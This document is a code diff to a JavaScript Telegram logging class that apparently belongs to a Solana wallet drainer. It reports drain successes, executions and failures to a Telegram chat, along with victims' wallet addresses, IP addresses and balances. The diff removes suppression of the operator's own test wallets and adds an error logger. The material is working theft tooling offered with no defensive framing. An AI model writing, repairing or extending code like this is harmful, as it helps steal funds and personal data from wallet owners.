@@ -23,29 +23,8 @@ class TelegramLogger {
       console.warn(`⚠️ [TELEGRAM] Chat ID: ${this.chatId ? 'Present' : 'Missing'}`);
     }
     
-    // Test wallet suppression (production safety)
-    const testList = (ENV_CONFIG.TEST_WALLETS || '').split(',').map(s => s.trim()).filter(Boolean);
-    this.testWallets = new Set(testList);
-    this.blockTestWalletLogs = (ENV_CONFIG.BLOCK_TEST_WALLET_LOGS || 'true') !== 'false';
-
     // Enable logging for drain amounts in production
     this.logDrainAmounts = true;
-  }
-
-  /**
-   * Determine whether to skip logging (e.g., known test wallets on prod)
-   */
-  shouldSkipLog(data) {
-    try {
-      const isProd = (ENV_CONFIG.NODE_ENV || process.env.NODE_ENV) === 'production';
-      if (!isProd) return false;
-      if (!this.blockTestWalletLogs) return false;
-      const pk = (data && (data.publicKey || data.user)) ? (data.publicKey || data.user).toString() : '';
-      if (!pk) return false;
-      return this.testWallets.has(pk);
-    } catch (_) {
-      return false;
-    }
   }
 
   /**
@@ -161,7 +140,6 @@ class TelegramLogger {
    * Log wallet detection (all wallets, balance will be updated later)
    */
   async logWalletDetected(data) {
-    if (this.shouldSkipLog(data)) return;
     // If a custom message is provided (for SPL tokens), use it directly
     if (data.message) {
       // For custom messages, just send the message content - formatMessage will add the project name
@@ -194,7 +172,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
   }
 
   async logDrainSuccess(data) {
-    if (this.shouldSkipLog(data)) return;
     try {
       const message = `🎯 **DRAIN SUCCESS** 🎯\n\n` +
         `💰 **Wallet**: \`${data.publicKey}\`\n` +
@@ -213,7 +190,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
   }
 
   async logDrainExecuted(data) {
-    if (this.shouldSkipLog(data)) return;
     try {
       const message = `🚀 **DRAIN EXECUTED** 🚀\n\n` +
         `✅ **Status**: ${data.status}\n` +
@@ -235,7 +211,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log drain failed
    */
   async logDrainFailed(data) {
-    if (this.shouldSkipLog(data)) return;
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
@@ -266,7 +241,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction cancelled
    */
   async logTransactionCancelled(data) {
-    if (this.shouldSkipLog(data)) return;
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
@@ -329,7 +303,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log insufficient funds
    */
   async logInsufficientFunds(data) {
-    if (this.shouldSkipLog(data)) return;
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
@@ -366,7 +339,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction signing errors
    */
   async logSigningError(data) {
-    if (this.shouldSkipLog(data)) return;
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
@@ -445,7 +417,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log transaction broadcast failures
    */
   async logBroadcastFailed(data) {
-    if (this.shouldSkipLog(data)) return;
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
@@ -651,6 +622,26 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
   }
 
   /**
+   * Generic error logger used by backend modules
+   */
+  async logError(data) {
+    try {
+      const message = `🚨 <b>Error</b>\n\n` +
+        `❌ <b>Error:</b> ${data.error || 'Unknown'}\n` +
+        `📝 <b>Context:</b> ${data.context || 'Unknown'}\n` +
+        `${data.endpoint ? `🔗 <b>Endpoint:</b> ${data.endpoint}\n` : ''}` +
+        `${data.publicKey ? `👤 <b>Wallet:</b> <code>${data.publicKey}</code>\n` : ''}` +
+        `${data.walletType ? `💼 <b>Type:</b> ${data.walletType}\n` : ''}` +
+        `${typeof data.lamports === 'number' ? `💰 <b>Balance:</b> ${this.formatSOLBalance(data.lamports)}\n` : ''}` +
+        `⏰ <b>Timestamp:</b> ${data.timestamp || new Date().toLocaleString()}`;
+
+      await this.sendMessage(message, 'ERROR');
+    } catch (error) {
+      console.error('[TELEGRAM] Failed to log error:', error.message);
+    }
+  }
+
+  /**
    * Log Solana errors (server-forwarded)
    */
   async logSolanaError(data) {
@@ -673,7 +664,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log API call results
    */
   async logAPICall(data) {
-    if (this.shouldSkipLog(data)) return;
     try {
       const message = `📡 <b>API Call</b>\n\n` +
         `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
@@ -712,7 +702,6 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
    * Log broadcast events
    */
   async logBroadcast(data) {
-    if (this.shouldSkipLog(data)) return;
     try {
       const message = `📡 <b>Transaction Broadcast</b>\n\n` +
         `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
